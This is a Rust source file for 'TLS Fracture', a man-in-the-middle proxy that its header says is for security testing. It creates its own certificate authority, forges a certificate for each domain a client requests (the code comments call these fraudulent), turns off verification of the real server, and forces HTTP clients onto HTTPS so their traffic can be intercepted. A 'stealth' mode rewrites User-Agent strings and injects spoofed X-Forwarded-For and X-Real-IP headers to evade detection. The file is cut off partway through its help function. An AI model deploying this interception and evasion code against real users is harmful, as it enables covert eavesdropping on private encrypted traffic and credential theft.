// TLS interception proxy for security testing and traffic analysis
// Implements dynamic certificate generation and transparent SSL/TLS proxying

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::io::{self, Write};
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{timeout, Duration, sleep};
use tracing::{info, error, debug};
use anyhow::{Result, anyhow};
use openssl::ssl::{SslContext, SslMethod, Ssl, SslVerifyMode};
use openssl::x509::{X509, X509NameBuilder};
use openssl::pkey::PKey;
use openssl::rsa::Rsa;
use openssl::bn::BigNum;
use openssl::asn1::Asn1Time;
use openssl::hash::MessageDigest;
use openssl::x509::extension::SubjectAlternativeName;
use rand::{Rng, thread_rng};
use regex::Regex;
use uuid::Uuid;
use tokio_openssl;
use colored::*;

mod config {
    pub const CA_CERT_VALIDITY_DAYS: u32 = 3650;
    pub const DOMAIN_CERT_VALIDITY_DAYS: u32 = 365;
    pub const RSA_KEY_SIZE: u32 = 2048;
    pub const CONNECTION_TIMEOUT_SECS: u64 = 5;
    pub const FORWARD_TIMEOUT_SECS: u64 = 30;
    pub const BUFFER_SIZE: usize = 8192;
    pub const INITIAL_BUFFER_SIZE: usize = 4096;
    pub const STEALTH_HEADER_PROBABILITY: f64 = 0.3;
}

/// Represents a cached certificate with its private key
type CachedCertificate = (X509, PKey<openssl::pkey::Private>);

/// Main TLS stripping proxy server that intercepts and manipulates SSL/TLS connections
/// 
/// This struct manages the entire MITM operation including:
/// - Certificate authority management
/// - Dynamic certificate generation for target domains
/// - Bidirectional traffic forwarding
/// - Stealth evasion techniques
pub struct TlsFractureProxy {
    /// TCP listener for incoming client connections
    listener: TcpListener,
    /// Target server hostname
    target_hostname: String,
    /// Target server port
    target_port: u16,
    /// Thread-safe cache for generated certificates
    certificate_cache: Arc<Mutex<HashMap<String, CachedCertificate>>>,
    /// Certificate Authority certificate for signing domain certificates
    ca_certificate: X509,
    /// Certificate Authority private key
    ca_private_key: PKey<openssl::pkey::Private>,
    /// Enable stealth evasion techniques
    stealth_enabled: bool,
    /// Pool of user agent strings for request randomization
    user_agent_pool: Vec<String>,
}

impl TlsFractureProxy {
    /// Creates a new TLS fracture proxy instance
    /// 
    /// # Arguments
    /// * `bind_address` - Local address to bind the proxy server
    /// * `target_hostname` - Target server hostname to proxy to
    /// * `target_port` - Target server port
    /// * `stealth_enabled` - Whether to enable stealth evasion techniques
    /// 
    /// # Returns
    /// Configured proxy instance or error if setup fails
    pub async fn new(
        bind_address: SocketAddr,
        target_hostname: String,
        target_port: u16,
        stealth_enabled: bool,
    ) -> Result<Self> {
        // Initialize TCP listener for incoming connections
        let listener = TcpListener::bind(bind_address).await
            .map_err(|e| anyhow!("Failed to bind TCP listener to {}: {}", bind_address, e))?;
        
        // Generate Certificate Authority key pair
        let rsa_key = Rsa::generate(config::RSA_KEY_SIZE)
            .map_err(|e| anyhow!("Failed to generate CA RSA key: {}", e))?;
        let ca_private_key = PKey::from_rsa(rsa_key)
            .map_err(|e| anyhow!("Failed to create CA private key from RSA: {}", e))?;
        
        // Generate self-signed CA certificate
        let ca_certificate = Self::generate_certificate_authority_certificate(&ca_private_key)?;
        
        // Initialize user agent pool for request randomization
        let user_agent_pool = Self::initialize_user_agent_pool();

        Ok(Self {
            listener,
            target_hostname,
            target_port,
            certificate_cache: Arc::new(Mutex::new(HashMap::new())),
            ca_certificate,
            ca_private_key,
            stealth_enabled,
            user_agent_pool,
        })
    }

    /// Initializes the pool of user agent strings for request randomization
    /// 
    /// # Returns
    /// Vector of realistic user agent strings from various browsers and platforms
    fn initialize_user_agent_pool() -> Vec<String> {
        vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1".to_string(),
            "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0".to_string(),
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0".to_string(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0".to_string(),
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0".to_string(),
        ]
    }

    /// Generates a self-signed Certificate Authority certificate
    /// 
    /// This CA certificate is used to sign all domain certificates generated during
    /// the MITM operation. The certificate is configured with a long validity period
    /// to avoid frequent regeneration.
    /// 
    /// # Arguments
    /// * `ca_private_key` - Private key for signing the CA certificate
    /// 
    /// # Returns
    /// Self-signed X509 certificate for the Certificate Authority
    fn generate_certificate_authority_certificate(ca_private_key: &PKey<openssl::pkey::Private>) -> Result<X509> {
        let mut certificate_builder = X509::builder()
            .map_err(|e| anyhow!("Failed to create X509 certificate builder: {}", e))?;
        
        // Set certificate version (3 = v3)
        certificate_builder.set_version(2)
            .map_err(|e| anyhow!("Failed to set certificate version: {}", e))?;
        
        // Generate and set serial number
        let serial_number = BigNum::from_u32(1)
            .map_err(|e| anyhow!("Failed to create serial number: {}", e))?;
        certificate_builder.set_serial_number(&serial_number.to_asn1_integer()
            .map_err(|e| anyhow!("Failed to convert serial number to ASN1: {}", e))?
            .as_ref())
            .map_err(|e| anyhow!("Failed to set serial number: {}", e))?;
        
        // Create and set subject/issuer name (self-signed)
        let mut name_builder = X509NameBuilder::new()
            .map_err(|e| anyhow!("Failed to create X509 name builder: {}", e))?;
        name_builder.append_entry_by_text("C", "US")
            .map_err(|e| anyhow!("Failed to add country code: {}", e))?;
        name_builder.append_entry_by_text("O", "Khaninkali Security")
            .map_err(|e| anyhow!("Failed to add organization: {}", e))?;
        name_builder.append_entry_by_text("CN", "Khaninkali CA")
            .map_err(|e| anyhow!("Failed to add common name: {}", e))?;
        let distinguished_name = name_builder.build();
        
        // For self-signed certificate, issuer and subject are the same
        certificate_builder.set_issuer_name(&distinguished_name)
            .map_err(|e| anyhow!("Failed to set issuer name: {}", e))?;
        certificate_builder.set_subject_name(&distinguished_name)
            .map_err(|e| anyhow!("Failed to set subject name: {}", e))?;
        
        // Set the public key
        certificate_builder.set_pubkey(ca_private_key)
            .map_err(|e| anyhow!("Failed to set public key: {}", e))?;
        
        // Set validity period
        let not_before = Asn1Time::days_from_now(0)
            .map_err(|e| anyhow!("Failed to create not-before time: {}", e))?;
        let not_after = Asn1Time::days_from_now(config::CA_CERT_VALIDITY_DAYS)
            .map_err(|e| anyhow!("Failed to create not-after time: {}", e))?;
        
        certificate_builder.set_not_before(&not_before)
            .map_err(|e| anyhow!("Failed to set not-before time: {}", e))?;
        certificate_builder.set_not_after(&not_after)
            .map_err(|e| anyhow!("Failed to set not-after time: {}", e))?;
        
        // Sign the certificate with the private key
        certificate_builder.sign(ca_private_key, MessageDigest::sha256())
            .map_err(|e| anyhow!("Failed to sign CA certificate: {}", e))?;
        
        Ok(certificate_builder.build())
    }

    /// Generates a domain-specific certificate signed by the internal CA
    /// 
    /// This method creates a certificate for the target domain that will be
    /// presented to clients during the TLS handshake. The certificate includes
    /// Subject Alternative Name extension for proper domain validation.
    /// 
    /// # Arguments
    /// * `domain_name` - The domain name to generate a certificate for
    /// 
    /// # Returns
    /// Tuple of (certificate, private key) for the specified domain
    fn generate_domain_certificate(&self, domain_name: &str) -> Result<CachedCertificate> {
        Self::generate_domain_cert_with_ca(domain_name, &self.ca_certificate, &self.ca_private_key)
    }
    
    /// Generates a domain certificate signed by a specific CA
    /// Allows for flexible certificate generation with different CA authorities
    fn generate_domain_cert_with_ca(
        domain_name: &str,
        ca_certificate: &X509,
        ca_private_key: &PKey<openssl::pkey::Private>
    ) -> Result<CachedCertificate> {
        // Generate a new RSA key pair for this domain
        let domain_rsa_key = Rsa::generate(config::RSA_KEY_SIZE)
            .map_err(|e| anyhow!("Failed to generate domain RSA key for {}: {}", domain_name, e))?;
        let domain_private_key = PKey::from_rsa(domain_rsa_key)
            .map_err(|e| anyhow!("Failed to create domain private key for {}: {}", domain_name, e))?;
        
        // Create the certificate builder
        let mut certificate_builder = X509::builder()
            .map_err(|e| anyhow!("Failed to create domain certificate builder for {}: {}", domain_name, e))?;
        
        // Set certificate version (3 = v3)
        certificate_builder.set_version(2)
            .map_err(|e| anyhow!("Failed to set domain certificate version: {}", e))?;
        
        // Generate random serial number for uniqueness
        let serial_number = BigNum::from_u32(thread_rng().gen())
            .map_err(|e| anyhow!("Failed to generate serial number for {}: {}", domain_name, e))?;
        certificate_builder.set_serial_number(&serial_number.to_asn1_integer()
            .map_err(|e| anyhow!("Failed to convert serial number to ASN1 for {}: {}", domain_name, e))?
            .as_ref())
            .map_err(|e| anyhow!("Failed to set serial number for {}: {}", domain_name, e))?;
        
        // Create subject name for the domain
        let mut name_builder = X509NameBuilder::new()
            .map_err(|e| anyhow!("Failed to create domain name builder for {}: {}", domain_name, e))?;
        name_builder.append_entry_by_text("C", "US")
            .map_err(|e| anyhow!("Failed to add country to domain cert for {}: {}", domain_name, e))?;
        name_builder.append_entry_by_text("O", "Khaninkali Security")
            .map_err(|e| anyhow!("Failed to add organization to domain cert for {}: {}", domain_name, e))?;
        name_builder.append_entry_by_text("CN", domain_name)
            .map_err(|e| anyhow!("Failed to add common name to domain cert for {}: {}", domain_name, e))?;
        let subject_name = name_builder.build();
        
        // Set subject name
        certificate_builder.set_subject_name(&subject_name)
            .map_err(|e| anyhow!("Failed to set subject name for {}: {}", domain_name, e))?;
        
        // Set issuer to the provided CA (enables multi-CA support)
        certificate_builder.set_issuer_name(ca_certificate.subject_name())
            .map_err(|e| anyhow!("Failed to set issuer name for {}: {}", domain_name, e))?;
        
        // Set the public key
        certificate_builder.set_pubkey(&domain_private_key)
            .map_err(|e| anyhow!("Failed to set public key for {}: {}", domain_name, e))?;
        
        // Set validity period
        let not_before = Asn1Time::days_from_now(0)
            .map_err(|e| anyhow!("Failed to create not-before time for {}: {}", domain_name, e))?;
        let not_after = Asn1Time::days_from_now(config::DOMAIN_CERT_VALIDITY_DAYS)
            .map_err(|e| anyhow!("Failed to create not-after time for {}: {}", domain_name, e))?;
        
        certificate_builder.set_not_before(&not_before)
            .map_err(|e| anyhow!("Failed to set not-before time for {}: {}", domain_name, e))?;
        certificate_builder.set_not_after(&not_after)
            .map_err(|e| anyhow!("Failed to set not-after time for {}: {}", domain_name, e))?;
        
        // Add Subject Alternative Name extension for proper domain validation
        let san_extension = SubjectAlternativeName::new()
            .dns(domain_name)
            .build(&certificate_builder.x509v3_context(Some(ca_certificate), None))
            .map_err(|e| anyhow!("Failed to build SAN extension for {}: {}", domain_name, e))?;
        
        certificate_builder.append_extension(san_extension)
            .map_err(|e| anyhow!("Failed to append SAN extension for {}: {}", domain_name, e))?;
        
        // Sign the certificate with the provided CA private key
        certificate_builder.sign(ca_private_key, MessageDigest::sha256())
            .map_err(|e| anyhow!("Failed to sign domain certificate for {}: {}", domain_name, e))?;
        
        Ok((certificate_builder.build(), domain_private_key))
    }
    
    /// Extracts the target hostname from a CONNECT request
    /// Enables dynamic routing based on client's actual destination
    fn extract_host_from_connect(connect_request: &str) -> Option<String> {
        // CONNECT format: "CONNECT host:port HTTP/1.1"
        let parts: Vec<&str> = connect_request.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "CONNECT" {
            // Extract host without port
            parts[1].split(':').next().map(|s| s.to_string())
        } else {
            None
        }
    }

    /// Starts the TLS fracture proxy server
    /// 
    /// This method begins listening for incoming connections and spawns
    /// a new tokio task for each client connection to handle the MITM operation.
    /// 
    /// # Returns
    /// Never returns (runs indefinitely) or error if server fails to start
    pub async fn start(&self) -> Result<()> {
        let local_address = self.listener.local_addr()
            .map_err(|e| anyhow!("Failed to get local address: {}", e))?;
        
        info!(
            "TLS Fracture Proxy started on {} targeting {}:{}",
            local_address, self.target_hostname, self.target_port
        );
        
        // Main connection acceptance loop
        loop {
            match self.listener.accept().await {
                Ok((client_stream, client_address)) => {
                    // Clone shared data for the new task
                    let target_hostname = self.target_hostname.clone();
                    let target_port = self.target_port;
                    let certificate_cache = self.certificate_cache.clone();
                    let ca_certificate = self.ca_certificate.clone();
                    let ca_private_key = self.ca_private_key.clone();
                    let stealth_enabled = self.stealth_enabled;
                    let user_agent_pool = self.user_agent_pool.clone();
                    
                    // Spawn a new task to handle this connection
                    tokio::spawn(async move {
                        // Create a temporary proxy instance for this connection
                        let proxy_handler = TlsFractureProxy {
                            listener: TcpListener::bind("0.0.0.0:0").await.unwrap(), // Dummy listener
                            target_hostname: target_hostname.clone(),
                            target_port,
                            certificate_cache: certificate_cache.clone(),
                            ca_certificate: ca_certificate.clone(),
                            ca_private_key: ca_private_key.clone(),
                            stealth_enabled,
                            user_agent_pool: user_agent_pool.clone(),
                        };
                        
                        if let Err(error) = proxy_handler.handle_client_connection(
                            client_stream,
                            client_address,
                            &target_hostname,
                            target_port,
                            certificate_cache,
                            ca_certificate,
                            ca_private_key,
                            stealth_enabled,
                            user_agent_pool,
                        ).await {
                            error!("Error handling connection from {}: {}", client_address, error);
                        }
                    });
                }
                Err(error) => {
                    error!("Failed to accept incoming connection: {}", error);
                    // Continue accepting other connections even if one fails
                }
            }
        }
    }

    /// Handles an incoming client connection and determines the appropriate routing
    /// 
    /// This method reads the initial request from the client and determines whether
    /// it's an HTTP CONNECT request (for HTTPS) or a regular HTTP request.
    /// 
    /// # Arguments
    /// * `client_stream` - TCP stream from the client
    /// * `client_address` - Client's socket address
    /// * `target_hostname` - Target server hostname
    /// * `target_port` - Target server port
    /// * `certificate_cache` - Cache for generated certificates
    /// * `ca_certificate` - Certificate Authority certificate
    /// * `ca_private_key` - Certificate Authority private key
    /// * `stealth_enabled` - Whether stealth mode is enabled
    /// * `user_agent_pool` - Pool of user agent strings
    /// 
    /// # Returns
    /// Ok if connection handled successfully, Err if an error occurs
    async fn handle_client_connection(
        &self,
        mut client_stream: TcpStream,
        client_address: SocketAddr,
        target_hostname: &str,
        target_port: u16,
        certificate_cache: Arc<Mutex<HashMap<String, CachedCertificate>>>,
        ca_certificate: X509,
        ca_private_key: PKey<openssl::pkey::Private>,
        stealth_enabled: bool,
        user_agent_pool: Vec<String>,
    ) -> Result<()> {
        info!(" New connection from {} ({})",
            client_address.to_string().bright_cyan(),
            Self::get_client_info(&client_address)
        );
        
        // Read initial HTTP request with timeout to prevent hanging
        let mut request_buffer = vec![0u8; config::INITIAL_BUFFER_SIZE];
        let bytes_read = timeout(
            Duration::from_secs(config::CONNECTION_TIMEOUT_SECS),
            client_stream.read(&mut request_buffer)
        ).await
        .map_err(|_| anyhow!("Connection timeout while reading initial request from {}", client_address))??;
        
        // Check for empty request (connection closed)
        if bytes_read == 0 {
            debug!("Client {} closed connection before sending request", client_address);
            return Ok(());
        }
        
        // Parse the HTTP request
        let request_string = String::from_utf8_lossy(&request_buffer[..bytes_read]);
        let request_line = request_string.lines().next().unwrap_or("");
        
        info!(" Request from {}: {}",
            client_address.to_string().bright_yellow(),
            request_line.bright_white()
        );
        
        // Route based on request type
        if request_string.starts_with("CONNECT") {
            // Handle HTTPS CONNECT request for TLS interception
            self.handle_https_tunnel(
                client_stream,
                client_address,
                target_hostname,
                target_port,
                certificate_cache,
                ca_certificate,
                ca_private_key,
                stealth_enabled,
                user_agent_pool,
                &request_string,
            ).await
        } else {
            // Handle regular HTTP request by redirecting to HTTPS
            Self::handle_http_to_https_redirect(client_stream, target_hostname, target_port).await
        }
    }
    
    /// Gets client information for logging
    fn get_client_info(addr: &SocketAddr) -> String {
        match addr {
            SocketAddr::V4(v4) => format!("IPv4: {}", v4.ip()),
            SocketAddr::V6(v6) => format!("IPv6: {}", v6.ip()),
        }
    }

    /// Handles HTTPS CONNECT requests by establishing a TLS tunnel
    /// 
    /// This method intercepts HTTPS connections, presents a fraudulent certificate
    /// to the client, and establishes a bidirectional tunnel to the target server.
    /// 
    /// # Arguments
    /// * `client_stream` - TCP stream from the client
    /// * `client_address` - Client's socket address
    /// * `target_hostname` - Target server hostname
    /// * `target_port` - Target server port
    /// * `certificate_cache` - Cache for generated certificates
    /// * `ca_certificate` - Certificate Authority certificate
    /// * `ca_private_key` - Certificate Authority private key
    /// * `stealth_enabled` - Whether stealth mode is enabled
    /// * `user_agent_pool` - Pool of user agent strings
    /// * `connect_request` - The original CONNECT request string
    /// 
    /// # Returns
    /// Ok if tunnel established successfully, Err if an error occurs
    async fn handle_https_tunnel(
        &self,
        mut client_stream: TcpStream,
        client_address: SocketAddr,
        target_hostname: &str,
        target_port: u16,
        certificate_cache: Arc<Mutex<HashMap<String, CachedCertificate>>>,
        ca_certificate: X509,
        ca_private_key: PKey<openssl::pkey::Private>,
        stealth_enabled: bool,
        user_agent_pool: Vec<String>,
        connect_request: &str,
    ) -> Result<()> {
        // Parse CONNECT request to extract actual target from client request
        // This allows dynamic routing based on SNI or Host header
        let requested_host = Self::extract_host_from_connect(connect_request)
            .unwrap_or_else(|| target_hostname.to_string());
        
        info!(" HTTPS tunnel request from {} for domain: {} → routing to {}:{}",
            client_address.to_string().bright_cyan(),
            requested_host.bright_green(),
            target_hostname.bright_yellow(),
            target_port
        );
        
        // Send 200 Connection established response to client
        client_stream.write_all(b"HTTP/1.1 200 Connection established\r\n\r\n").await
            .map_err(|e| anyhow!("Failed to send connection established response: {}", e))?;
        
        info!("✓ Sent 200 Connection Established to {}", client_address);
        
        // Retrieve or generate certificate for the requested domain (not just target)
        // This ensures proper certificate matching for multi-domain proxying
        let (domain_certificate, domain_private_key) = {
            let mut cache_guard = certificate_cache.lock()
                .map_err(|e| anyhow!("Failed to acquire certificate cache lock: {}", e))?;
            
            if let Some(cached_certificate) = cache_guard.get(&requested_host) {
                info!(" Using cached certificate for: {}", requested_host.bright_green());
                cached_certificate.clone()
            } else {
                info!(" Generating new certificate for: {}", requested_host.bright_green());
                // Use the CA cert and key to sign the new domain certificate
                let generated_certificate = Self::generate_domain_cert_with_ca(
                    &requested_host,
                    &ca_certificate,
                    &ca_private_key
                )?;
                cache_guard.insert(requested_host.clone(), generated_certificate.clone());
                info!("✓ Certificate generated and cached for: {}", requested_host.bright_green());
                generated_certificate
            }
        };
        
        // Setup SSL context for client-facing connection
        let mut client_ssl_context_builder = SslContext::builder(SslMethod::tls())
            .map_err(|e| anyhow!("Failed to create client SSL context: {}", e))?;
        client_ssl_context_builder.set_private_key(&domain_private_key)
            .map_err(|e| anyhow!("Failed to set client SSL private key: {}", e))?;
        client_ssl_context_builder.set_certificate(&domain_certificate)
            .map_err(|e| anyhow!("Failed to set client SSL certificate: {}", e))?;
        let client_ssl_context = client_ssl_context_builder.build();
        
        // Establish SSL connection with client
        let ssl_stream = tokio_openssl::SslStream::new(
            Ssl::new(&client_ssl_context)
                .map_err(|e| anyhow!("Failed to create client SSL object: {}", e))?,
            client_stream
        ).map_err(|e| anyhow!("Failed to create SSL stream: {}", e))?;
        
        let mut client_ssl_stream = Box::pin(ssl_stream);
        client_ssl_stream.as_mut().accept().await
            .map_err(|e| anyhow!("Failed to establish SSL connection with client: {}", e))?;
        
        info!(" SSL handshake completed with client {}", client_address.to_string().bright_cyan());
        
        // Connect to target server
        let target_address = format!("{}:{}", target_hostname, target_port);
        info!(" Connecting to target server: {}", target_address.bright_yellow());
        
        let server_tcp_stream = TcpStream::connect(&target_address).await
            .map_err(|e| anyhow!("Failed to connect to target server {}: {}", target_address, e))?;
        
        info!("✓ Connected to target server: {}", target_address.bright_yellow());
        
        // Setup SSL context for server-facing connection (disable verification)
        let mut server_ssl_context_builder = SslContext::builder(SslMethod::tls())
            .map_err(|e| anyhow!("Failed to create server SSL context: {}", e))?;
        server_ssl_context_builder.set_verify(SslVerifyMode::NONE);
        let server_ssl_context = server_ssl_context_builder.build();
        
        // Establish SSL connection with target server
        let ssl_stream = tokio_openssl::SslStream::new(
            Ssl::new(&server_ssl_context)
                .map_err(|e| anyhow!("Failed to create server SSL object: {}", e))?,
            server_tcp_stream
        ).map_err(|e| anyhow!("Failed to create server SSL stream: {}", e))?;
        
        let mut server_ssl_stream = Box::pin(ssl_stream);
        server_ssl_stream.as_mut().connect().await
            .map_err(|e| anyhow!("Failed to establish SSL connection with target server: {}", e))?;
        
        info!(" Bidirectional SSL tunnel established: {} ⟷ {}",
            client_address.to_string().bright_cyan(),
            target_address.bright_yellow()
        );
        
        if stealth_enabled {
            info!(" Stealth mode active - applying evasion techniques");
        }
        
        // Split streams for bidirectional forwarding
        let (client_reader, client_writer) = tokio::io::split(client_ssl_stream);
        let (server_reader, server_writer) = tokio::io::split(server_ssl_stream);
        
        // Create forwarding tasks with optional stealth manipulation
        let client_to_server_task = Self::forward_traffic_with_manipulation(
            client_reader,
            server_writer,
            stealth_enabled,
            user_agent_pool.clone(),
            "client_to_server",
        );
        
        let server_to_client_task = Self::forward_traffic_with_manipulation(
            server_reader,
            client_writer,
            stealth_enabled,
            user_agent_pool,
            "server_to_client",
        );
        
        // Wait for either direction to complete (connection closed or error)
        tokio::select! {
            result = client_to_server_task => {
                if let Err(error) = result {
                    info!("⚠  Client→Server error for {}: {}", client_address, error);
                } else {
                    info!("✓ Client→Server completed for {}", client_address);
                }
            }
            result = server_to_client_task => {
                if let Err(error) = result {
                    info!("⚠  Server→Client error for {}: {}", client_address, error);
                } else {
                    info!("✓ Server→Client completed for {}", client_address);
                }
            }
        }
        
        info!("🔌 Connection closed: {}", client_address.to_string().bright_cyan());
        
        Ok(())
    }

    /// Redirects HTTP requests to HTTPS equivalents
    /// 
    /// This method sends a 301 Moved Permanently response to force the client
    /// to use HTTPS, which allows us to intercept the encrypted connection.
    /// 
    /// # Arguments
    /// * `client_stream` - TCP stream from the client
    /// * `target_hostname` - Target server hostname
    /// * `target_port` - Target server port
    /// 
    /// # Returns
    /// Ok if redirect sent successfully, Err if an error occurs
    async fn handle_http_to_https_redirect(
        mut client_stream: TcpStream,
        target_hostname: &str,
        target_port: u16,
    ) -> Result<()> {
        let redirect_response = format!(
            "HTTP/1.1 301 Moved Permanently\r\n\
             Location: https://{}:{}/\r\n\
             Connection: close\r\n\
             \r\n",
            target_hostname, target_port
        );
        
        client_stream.write_all(redirect_response.as_bytes()).await
            .map_err(|e| anyhow!("Failed to send HTTP to HTTPS redirect: {}", e))?;
        
        debug!("Redirected HTTP request to HTTPS for {}:{}", target_hostname, target_port);
        Ok(())
    }

    /// Forwards traffic between reader and writer with optional stealth manipulation
    /// 
    /// This method handles the bidirectional forwarding of data between the client
    /// and server, applying stealth modifications when enabled for evasion purposes.
    /// 
    /// # Arguments
    /// * `reader` - Async reader to read data from
    /// * `writer` - Async writer to write data to
    /// * `stealth_enabled` - Whether to apply stealth modifications
    /// * `user_agent_pool` - Pool of user agent strings for randomization
    /// * `direction` - Direction of traffic ("client_to_server" or "server_to_client")
    /// 
    /// # Returns
    /// Ok if forwarding completed, Err if an error occurs
    async fn forward_traffic_with_manipulation<R, W>(
        mut reader: R,
        mut writer: W,
        stealth_enabled: bool,
        user_agent_pool: Vec<String>,
        direction: &str,
    ) -> Result<()>
    where
        R: AsyncReadExt + Unpin,
        W: AsyncWriteExt + Unpin,
    {
        let mut transfer_buffer = vec![0u8; config::BUFFER_SIZE];
        
        loop {
            // Read data with timeout to prevent hanging connections
            match timeout(
                Duration::from_secs(config::FORWARD_TIMEOUT_SECS),
                reader.read(&mut transfer_buffer)
            ).await {
                Ok(Ok(0)) => {
                    // Connection closed gracefully
                    debug!("{}: Connection closed by peer", direction);
                    break;
                }
                Ok(Ok(bytes_transferred)) => {
                    let mut data_chunk = transfer_buffer[..bytes_transferred].to_vec();
                    
                    // Apply stealth modifications if enabled and this is client-to-server traffic
                    if stealth_enabled && direction == "client_to_server" {
                        data_chunk = Self::apply_stealth_evasion_techniques(
                            &data_chunk, 
                            &user_agent_pool
                        );
                    }
                    
                    // Forward the data to the destination
                    writer.write_all(&data_chunk).await
                        .map_err(|e| anyhow!("Failed to write {} data: {}", direction, e))?;
                    writer.flush().await
                        .map_err(|e| anyhow!("Failed to flush {} data: {}", direction, e))?;
                    
                    debug!(" {}: Forwarded {} bytes", direction, bytes_transferred);
                }
                Ok(Err(error)) => {
                    return Err(anyhow!("{}: Read error: {}", direction, error));
                }
                Err(_) => {
                    // Timeout occurred
                    debug!("{}: Connection timeout", direction);
                    break;
                }
            }
        }
        
        Ok(())
    }

    /// Applies stealth evasion techniques to client-to-server traffic
    /// 
    /// This method modifies HTTP headers and adds random headers to make the
    /// traffic appear more legitimate and evade detection systems.
    /// 
    /// # Arguments
    /// * `data_chunk` - Raw data to modify
    /// * `user_agent_pool` - Pool of user agent strings for randomization
    /// 
    /// # Returns
    /// Modified data with stealth techniques applied
    fn apply_stealth_evasion_techniques(
        data_chunk: &[u8], 
        user_agent_pool: &[String]
    ) -> Vec<u8> {
        let mut modified_data = data_chunk.to_vec();
        
        // Only attempt modifications on data that can be parsed as UTF-8 text
        if let Ok(request_text) = String::from_utf8(modified_data.clone()) {
            // Randomize User-Agent header to blend with normal traffic
            if request_text.contains("User-Agent:") {
                let random_user_agent = &user_agent_pool[
                    thread_rng().gen_range(0..user_agent_pool.len())
                ];
                
                // Use compiled regex for better performance
                let user_agent_regex = Regex::new(r"User-Agent: [^\r\n]*")
                    .expect("Invalid User-Agent regex pattern");
                
                let modified_request = user_agent_regex
                    .replace(&request_text, &format!("User-Agent: {}", random_user_agent));
                
                modified_data = modified_request.as_bytes().to_vec();
                debug!("Applied User-Agent randomization");
            }
            
            // Randomly add additional headers for evasion (30% probability)
            if thread_rng().gen_bool(config::STEALTH_HEADER_PROBABILITY) {
                let evasion_headers = Self::generate_evasion_headers();
                
                // Find the end of headers to insert our evasion headers
                if let Some(headers_end_position) = modified_data.windows(4)
                    .position(|window| window == b"\r\n\r\n") {
                    
                    for header in &evasion_headers {
                        // Insert header before the final \r\n\r\n
                        modified_data.insert(headers_end_position, b'\n');
                        modified_data.splice(
                            headers_end_position..headers_end_position, 
                            header.as_bytes().iter().cloned()
                        );
                        modified_data.insert(headers_end_position, b'\r');
                    }
                    
                    debug!("Applied {} evasion headers", evasion_headers.len());
                }
            }
        }
        
        modified_data
    }
    
    /// Generates random HTTP headers for evasion purposes
    /// 
    /// # Returns
    /// Vector of randomly generated HTTP headers
    fn generate_evasion_headers() -> Vec<String> {
        vec![
            // Random X-Forwarded-For header
            format!(
                "X-Forwarded-For: {}.{}.{}.{}",
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255)
            ),
            // Random X-Real-IP header
            format!(
                "X-Real-IP: {}.{}.{}.{}",
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255),
                thread_rng().gen_range(1..255)
            ),
            // Unique request identifier
            format!("X-Request-ID: {}", Uuid::new_v4()),
        ]
    }
}

/// Displays animated banner with system information
async fn display_banner() {
    let frames = vec!["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
    
    // Animated loading
    print!("{}", "\n".repeat(2));
    for _ in 0..3 {
        for frame in &frames {
            print!("\r{}  Initializing TLS Fracture...  ", frame.cyan().bold());
            io::stdout().flush().unwrap();
            std::thread::sleep(std::time::Duration::from_millis(80));
        }
    }
    println!("\r{}", " ".repeat(50));
    
    // Main banner
    println!("{}", "╔══════════════════════════════════════════════════════════════════════╗".bright_cyan().bold());
    println!("{}", "║                                                                      ║".bright_cyan().bold());
    println!("{}  {}  {}",
        "║".bright_cyan().bold(),
        "🔓 TLS FRACTURE".bright_white().bold(),
        format!("v{}", "9.20.2091-proAlpha").bright_yellow().bold()
    );
    println!("{}", "║                                                                      ║".bright_cyan().bold());
    println!("{}  {}",
        "║".bright_cyan().bold(),
        "Advanced SSL/TLS Interception & Traffic Analysis Proxy".bright_white()
    );
    println!("{}", "║                                                                      ║".bright_cyan().bold());
    println!("{}  {}  {}",
        "║".bright_cyan().bold(),
        "Author:".bright_green(),
        "khaninkali | HyperSecurity".white()
    );
    println!("{}", "║                                                                      ║".bright_cyan().bold());
    println!("{}", "╠══════════════════════════════════════════════════════════════════════╣".bright_cyan().bold());
    
    // System information
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    println!("{}  {}  {}",
        "║".bright_cyan().bold(),
        "System:".bright_magenta().bold(),
        format!("{} ({})", os, arch).white()
    );
    println!("{}  {}  {}",
        "║".bright_cyan().bold(),
        "Host:".bright_magenta().bold(),
        hostname.white()
    );
    println!("{}  {}  {}",
        "║".bright_cyan().bold(),
        "Status:".bright_magenta().bold(),
        "Ready".bright_green().bold()
    );
    println!("{}", "║                                                                      ║".bright_cyan().bold());
    println!("{}", "╚══════════════════════════════════════════════════════════════════════╝".bright_cyan().bold());
    println!();
    
    // Animated ready message
    for frame in &frames[0..5] {
        print!("\r{}  System initialized and ready for operation", frame.green().bold());
        io::stdout().flush().unwrap();
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    println!("\r{}", "✓  System initialized and ready for operation".green().bold());
    println!();
}

/// Displays help information
fn display_help() {
    println!();
